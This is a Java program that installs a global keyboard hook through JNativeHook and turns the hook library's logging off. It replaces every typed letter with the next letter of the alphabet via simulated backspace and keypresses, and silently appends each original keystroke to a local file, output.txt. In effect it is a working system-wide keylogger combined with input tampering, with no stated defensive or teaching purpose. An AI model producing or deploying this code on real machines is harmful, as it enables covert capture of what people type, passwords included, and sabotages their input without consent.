package com.example;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyReplacer implements NativeKeyListener {
    private Robot robot;
    private FileWriter writer;
    private static final int TYPING_DELAY = 10;
    private static long lastTypedTime = 0;
    private static final int COOLDOWN_MS = 100;

    public KeyReplacer() {
        try {
            robot = new Robot();
            robot.setAutoDelay(TYPING_DELAY);
            writer = new FileWriter("output.txt", true);
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    private void typeCharacter(char c) {
        boolean upper = Character.isUpperCase(c);
        int keyCode = KeyEvent.getExtendedKeyCodeForChar(c);

        if (keyCode == KeyEvent.VK_UNDEFINED) return;

        if (upper) robot.keyPress(KeyEvent.VK_SHIFT);
        robot.keyPress(keyCode);
        robot.keyRelease(keyCode);
        if (upper) robot.keyRelease(KeyEvent.VK_SHIFT);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        long currentTime = System.currentTimeMillis();

        // Skip if cooldown not elapsed
        if (currentTime - lastTypedTime < COOLDOWN_MS) {
            return;
        }

        char original = e.getKeyChar();

        if (Character.isLetter(original)) {
            try {
                // Simulate backspace
                robot.keyPress(KeyEvent.VK_BACK_SPACE);
                robot.keyRelease(KeyEvent.VK_BACK_SPACE);

                // Replace character
                char replaced = (Character.isLowerCase(original))
                        ? (char) (original == 'z' ? 'a' : original + 1)
                        : (char) (original == 'Z' ? 'A' : original + 1);

                // Type replacement
                typeCharacter(replaced);

                // Log the original
                writer.write(original);
                writer.flush();

                // Set cooldown
                lastTypedTime = System.currentTimeMillis();

            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        // Disable jnativehook logging
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
            return;
        }

        KeyReplacer replacer = new KeyReplacer();
        GlobalScreen.addNativeKeyListener(replacer);

        // Graceful shutdown on exit
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            try {
                GlobalScreen.unregisterNativeHook();
                if (replacer.writer != null) {
                    replacer.writer.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }));
    }
}
